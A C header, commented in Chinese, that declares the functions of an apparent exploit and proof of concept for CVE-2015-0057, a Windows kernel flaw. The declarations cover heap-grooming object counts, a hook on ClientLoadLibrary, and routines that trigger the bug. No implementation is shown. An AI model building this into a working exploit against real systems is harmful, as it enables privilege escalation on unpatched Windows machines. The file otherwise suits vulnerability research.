#pragma once
#include "base.h"

#define JUNK_OBJECTS 0x1000		// 填充空闲内存块
#define FAKE_OBJECTS 0x300		// 用来占位tagSBINFO

typedef DWORD (WINAPI *lpClientLoadLibrary)(DWORD arg0);

BOOL Exploit_CVE_2015_0057();
BOOL Init_CVE_2015_0057();
LRESULT CALLBACK WndProc_CVE_2015_0057(HWND hWnd,
									   UINT msg,
									   WPARAM wParam,
									   LPARAM lParam);
BOOL Trigger_CVE_2015_0057();
DWORD MyClientLoadLibrary(DWORD arg0);		// Hook以后要执行的函数
PDWORD GetClientLoadLibrary();				// 获取保存ClientLoadLibrary的地址
BOOL HookClientLoadLibrary();
BOOL UnHookClientLoadLibrary();
BOOL POC_CVE_2015_0057();